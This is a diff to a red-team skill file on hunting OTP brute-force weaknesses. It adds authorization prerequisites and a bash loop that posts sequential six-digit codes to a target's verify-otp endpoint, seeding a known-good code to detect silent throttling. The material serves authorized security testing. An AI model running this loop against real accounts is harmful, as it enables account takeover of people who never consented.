@@ -16,6 +16,40 @@ tags: [brute-force, hunt, redteam]
 > well-documented (e.g. Laxman Muthiyah's Instagram password-reset OTP race/rotation
 > research, 2019–2021), it is named below as a *technique reference*, not a payout claim.
 
+## When to Use
+
+- The target surface matches this skill's scope (`hunt-brute-force`) and you need a focused procedure for it.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `ffuf`, `hydra`, `nuclei`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Seed: position 500 in the brute set is the REAL OTP for your own test account.
+# If the loop reaches 500 and the correct code no longer authenticates,
+# the endpoint is silently throttling/dropping — NOT unprotected.
+KNOWN_GOOD="123456"   # the actual current OTP for YOUR test account
+for n in $(seq 0 600); do
+  CODE=$([ "$n" = "500" ] && echo "$KNOWN_GOOD" || printf "%06d" "$n")
+  CODE_RESP=$(curl --max-time 30 --connect-timeout 10 -s -o /tmp/bf_body -w "%{http_code} %{time_total}" \
+    -X POST "https://$TARGET/api/verify-otp" \
+    -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
+    -d "{\"otp\":\"$CODE\"}")
+  echo "$n $CODE $CODE_RESP $(wc -c </tmp/bf_body)"
+done
+# Three columns to watch: status, time_total, body size.
+# Rising time_total or a body-size change with status unchanged = shadow throttle.
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 OTP brute force (6-digit = 1,000,000 combinations) with no effective rate limit = Critical ATO bypass.
